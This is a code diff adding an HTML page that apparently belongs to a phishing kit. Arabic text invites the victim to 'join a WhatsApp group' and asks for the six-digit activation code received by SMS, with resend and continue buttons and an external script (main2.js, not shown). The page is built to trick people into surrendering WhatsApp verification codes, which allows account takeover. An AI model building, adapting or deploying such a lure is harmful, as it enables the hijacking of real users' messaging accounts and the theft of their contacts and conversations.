@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>International Code Input</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="icon" href="Smoflo.png" type="image/png"> <!-- Favicon -->
+    <link rel="stylesheet" href="styles.css" />
+    <script src="main2.js" defer></script>
+</head>
+<body>
+    <div class="container">
+        <img src="DSxOAUB0raA.png" alt="Logo" class="logo"> <!-- Replace with your logo -->
+        <div>
+            <img src="172245867233593622.png" alt="Description Image" class="description-img"> <!-- Replace with your image -->
+            <form>
+                <h4 style="color:#5E5E5E; font-size: large;">الدعوة للانضمام إلى مجموعة واتساب</h4>
+                <h4 style="color:#5E5E5E;">أدخل رمز تفعيل الإضافة المكون من 6 أرقام
+                    الذي تلقيته من خلال رسالة نصية</h4>
+                <div class="code-input">
+                    <input id="code" type="text" name="code" required pattern="[0-9]*" title="Please enter numbers only" maxlength="6" placeholder="******" />
+                </div>
+                <div>
+                    <button type="button" onclick="handleResend()" style="padding: 10px 20px; font-size: 16px; background-color: #FFC107; color: #fff; border-radius: 5px; cursor: pointer; margin-top: 10px; display: inline-block; width: 150px;">إعادة إرسال</button>
+                    <div>
+                    <button style="padding: 10px 20px; font-size: 16px; background-color: #4CAF50; color: #fff; border-radius: 5px; cursor: pointer; margin-top: 10px; display: inline-block; width: 150px;" type="submit">متابعة</button>
+                </div>
+            </form>
+            <div class="alert alert-info" style="display: none;"></div>
+        </div>
+    </div>
+</body>
+</html>
